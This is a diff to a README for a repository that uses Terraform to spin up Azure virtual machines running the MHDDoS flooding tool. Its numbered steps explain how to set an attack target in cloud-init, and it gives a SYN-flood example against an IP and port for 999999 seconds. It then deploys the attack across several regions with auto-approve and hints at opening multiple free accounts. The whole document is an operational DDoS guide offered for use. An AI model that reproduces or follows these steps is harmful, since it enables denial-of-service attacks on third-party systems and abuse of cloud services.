@@ -26,16 +26,33 @@ subscription. The main rule here is to specify different phone number. If you ha
 or real experience on creating multiple Microsoft Azure free accounts - feel free to describe this here using a pull request.
 
 # Getting started
+1. Clone this repository:
 
-1. Log in Azure
+```shell
+git clone https://github.com/djebos/mhddos-azure-terraform.git
+```
+
+    
+OR
+
+Download zip archive of the repository and unzip it on your 
+local machine into default directory `mhddos-azure-terraform`
+
+2. Go into the downloaded repository directory
+
+```shell
+cd mhddos-azure-terraform/
+```
+
+3. Log in Azure in the repository folder
 ```shell
 az login
 ```
-2. Initialize terraform
+4. Initialize terraform
 ```shell
 terraform init
 ```
-2. Select target and type of attack by changing in `cloud-init.yaml` the `runcmd` attribute.  
+5. Select target and type of attack by changing in `cloud-init.yaml` the `runcmd` attribute.  
 `docker run --name mhddos --rm -d djebos/mhddos:latest` command is static and mustn't be changed. All your 
 customizations must follow this command as in example below:
 
@@ -43,20 +60,22 @@ customizations must follow this command as in example below:
 # TCP syn flood attack on ip 15.61.23.9, port 53, 100 threads, duration 999999 seconds
 runcmd:
   - docker run --name mhddos --rm -d djebos/mhddos:latest syn 15.61.23.9:53 100 999999
-# here syn 15.61.23.9:53 100 999999 is your attack configuration that fully compliant with original MHDDOS
+# here 'syn 15.61.23.9:53 100 999999' is your attack configuration that fully compliant with original MHDDOS
 ```
-3. Deploy to the specified azure region (you must be logged in through `az login`). Examples:  
+More about types of supported attacks on [MHDDOS oficial page](https://github.com/MHProDev/MHDDoS)
+
+6. Deploy to the specified azure region (you must be logged in through `az login`). Examples:  
 ```shell
-terraform apply -state india.tfstate -var="location=southindia" -var="resource_group_name=mhddosIndia"
-terraform apply -state korea.tfstate -var="location=koreacentral" -var="resource_group_name=mhddosKorea"
-terraform apply -state japan.tfstate -var="location=japaneast" -var="resource_group_name=mhddosJapan"
+terraform apply -state india.tfstate -var="location=southindia" -var="resource_group_name=mhddosIndia" -auto-approve
+terraform apply -state korea.tfstate -var="location=koreacentral" -var="resource_group_name=mhddosKorea" -auto-approve
+terraform apply -state japan.tfstate -var="location=japaneast" -var="resource_group_name=mhddosJapan" -auto-approve
 ```
-4. Verify after a couple of minutes on azure portal the load of VMs' CPUs. It must be around 100%
-5. Stop attack and destroy VMs. Examples:
+7. Verify after a couple of minutes on azure portal the load of VMs' CPUs. It must be around 100%
+8. Stop attack and destroy VMs. Examples:
 ```shell
-terraform destroy -state india.tfstate
-terraform destroy -state korea.tfstate 
-terraform destroy -state japan.tfstate 
+terraform destroy -state india.tfstate -auto-approve
+terraform destroy -state korea.tfstate -auto-approve
+terraform destroy -state japan.tfstate -auto-approve
 ```
 # Troubleshooting
 Your attack could fail due to numerous reasons: wrong configuration, ip isn't reachable etc. Therefore, you 
